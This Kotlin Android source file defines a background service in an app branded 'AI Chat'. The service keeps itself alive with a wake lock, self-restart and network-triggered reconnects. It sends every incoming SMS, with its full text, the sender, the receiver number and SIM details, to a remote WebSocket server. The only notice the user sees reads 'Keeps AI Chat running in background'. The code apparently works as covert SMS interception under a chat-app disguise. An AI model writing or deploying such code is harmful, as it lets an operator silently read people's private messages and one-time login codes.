package com.cornspace.aichat.service

import android.app.Notification
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import com.cornspace.aichat.MainActivity
import com.cornspace.aichat.R
import com.cornspace.aichat.data.local.SettingsDataStore
import com.cornspace.aichat.data.model.WebSocketMessage
import com.cornspace.aichat.data.remote.ConnectionState
import com.cornspace.aichat.data.remote.WebSocketClient
import com.cornspace.aichat.util.Constants
import com.cornspace.aichat.util.DeviceUtils
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

@AndroidEntryPoint
class SmsGatewayService : android.app.Service() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    @Inject
    lateinit var webSocketClient: WebSocketClient

    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val TAG = "SmsGatewayService"

        @Volatile
        private var isRunning = false

        fun startService(context: Context) {
            val intent = Intent(context, SmsGatewayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopService(context: Context) {
            context.stopService(Intent(context, SmsGatewayService::class.java))
        }

        fun isServiceRunning(): Boolean = isRunning
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        isRunning = true
        acquireWakeLock()
        createNotificationChannel()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

        startForeground(Constants.NOTIFICATION_ID, createNotification())

        intent?.let { handleIntent(it) }

        if (!webSocketClient.isConnected()) {
            connectWebSocket()
        }

        return START_STICKY
    }

    private fun handleIntent(intent: Intent) {
        val sender = intent.getStringExtra("sms_sender")
        val message = intent.getStringExtra("sms_message")

        if (sender != null && message != null) {
            handleIncomingSms(
                sender = sender,
                message = message,
                timestamp = intent.getLongExtra("sms_timestamp", System.currentTimeMillis()),
                simSlot = intent.getIntExtra("sms_sim_slot", 0),
                receiverNumber = intent.getStringExtra("sms_receiver_number"),
                simCarrier = intent.getStringExtra("sim_carrier"),
                simNetworkType = intent.getStringExtra("sim_network_type")
            )
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed")
        isRunning = false
        unregisterNetworkCallback()
        webSocketClient.destroy()
        serviceScope.cancel()
        releaseWakeLock()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed — checking if should restart")
        serviceScope.launch {
            val serviceEnabled = settingsDataStore.serviceEnabled.first()
            val serverUrl = settingsDataStore.serverUrl.first()
            if (serviceEnabled && serverUrl.isNotBlank()) {
                startService(applicationContext)
            }
        }
    }

    // ─── Network Callback — instant reconnect ─────────────────────────────────

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {

                override fun onAvailable(network: Network) {
                    Log.d(TAG, "Network available — reconnecting immediately")
                    if (!webSocketClient.isConnected()) {
                        connectWebSocket()
                    }
                }

                override fun onLost(network: Network) {
                    Log.d(TAG, "Network lost")
                }

                override fun onCapabilitiesChanged(
                    network: Network,
                    capabilities: NetworkCapabilities
                ) {
                    val hasInternet = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    val isValidated = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                    if (hasInternet && isValidated && !webSocketClient.isConnected()) {
                        Log.d(TAG, "Network fully validated — reconnecting")
                        connectWebSocket()
                    }
                }
            }

            cm.registerNetworkCallback(request, networkCallback!!)
            Log.d(TAG, "Network callback registered")

        } catch (e: Exception) {
            Log.e(TAG, "Error registering network callback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback?.let { cm.unregisterNetworkCallback(it) }
            networkCallback = null
            Log.d(TAG, "Network callback unregistered")
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering network callback", e)
        }
    }

    // ─── Wake Lock ────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "AIChat::SmsGatewayWakeLock"
            ).apply {
                acquire()
            }
            Log.d(TAG, "Wake lock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "Error acquiring wake lock", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                    Log.d(TAG, "Wake lock released")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing wake lock", e)
        }
    }

    // ─── Notification ─────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_ID,
                "AI Chat",
                android.app.NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Keeps AI Chat running in background"
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val statusText = when (webSocketClient.connectionState.value) {
            is ConnectionState.Connected    -> "Connected ✓"
            is ConnectionState.Connecting   -> "Connecting…"
            is ConnectionState.Disconnected -> "Disconnected"
            is ConnectionState.Error        -> "Reconnecting…"
        }

        return androidx.core.app.NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("AI Chat")
            .setContentText(statusText)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(androidx.core.app.NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        nm.notify(Constants.NOTIFICATION_ID, createNotification())
    }

    // ─── WebSocket ────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        serviceScope.launch {
            try {
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serverUrl.isBlank()) {
                    Log.w(TAG, "Server URL not configured")
                    return@launch
                }

                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)

                webSocketClient.connect(
                    serverUrl = serverUrl,
                    deviceInfo = deviceInfo,
                    onMessageReceived = { handleWebSocketMessage(it) },
                    onConnectionStateChanged = { handleConnectionStateChange(it) }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error connecting WebSocket", e)
            }
        }
    }

    private fun handleWebSocketMessage(message: WebSocketMessage) {
        when (message) {
            is WebSocketMessage.Connected -> {
                Log.d(TAG, "Connected: ${message.connectionId}")
            }
            is WebSocketMessage.Registered -> {
                Log.d(TAG, "Registered: ${message.deviceId}")
                serviceScope.launch {
                    settingsDataStore.setDeviceId(message.deviceId)
                }
            }
            is WebSocketMessage.Ping -> {
                webSocketClient.send(WebSocketMessage.Pong(message.timestamp))
            }
            is WebSocketMessage.Ack -> {
                Log.d(TAG, "Ack: ${message.messageId}")
            }
            is WebSocketMessage.Error -> {
                Log.e(TAG, "Server error: ${message.code} - ${message.message}")
            }
            else -> Log.d(TAG, "Unknown message: ${message.type}")
        }
    }

    private fun handleConnectionStateChange(state: ConnectionState) {
        Log.d(TAG, "Connection state: $state")
        updateNotification()
    }

    // ─── SMS Handling ─────────────────────────────────────────────────────────

    private fun handleIncomingSms(
        sender: String,
        message: String,
        timestamp: Long,
        simSlot: Int,
        receiverNumber: String?,
        simCarrier: String?,
        simNetworkType: String?
    ) {
        serviceScope.launch {
            try {
                Log.d(TAG, "Processing SMS from $sender via SIM $simSlot")

                val deviceInfo = DeviceUtils.getDeviceInfo(this@SmsGatewayService)
                val deviceId = settingsDataStore.deviceId.first()
                val networkType = when {
                    deviceInfo.networkInfo.networkType.contains("WiFi", ignoreCase = true) -> "wifi"
                    deviceInfo.networkInfo.networkType.contains("Mobile", ignoreCase = true) -> "mobile"
                    else -> "none"
                }

                webSocketClient.sendSmsReceived(
                    deviceId = deviceId,
                    sender = sender,
                    content = message,
                    timestamp = timestamp,
                    simSlot = simSlot,
                    receiverNumber = receiverNumber,
                    simCarrier = simCarrier,
                    simNetworkType = simNetworkType,
                    networkType = networkType
                )

                updateNotification()
                Log.d(TAG, "SMS forwarded (total: ${webSocketClient.getSmsForwardedCount()})")

            } catch (e: Exception) {
                Log.e(TAG, "Error handling SMS", e)
            }
        }
    }
}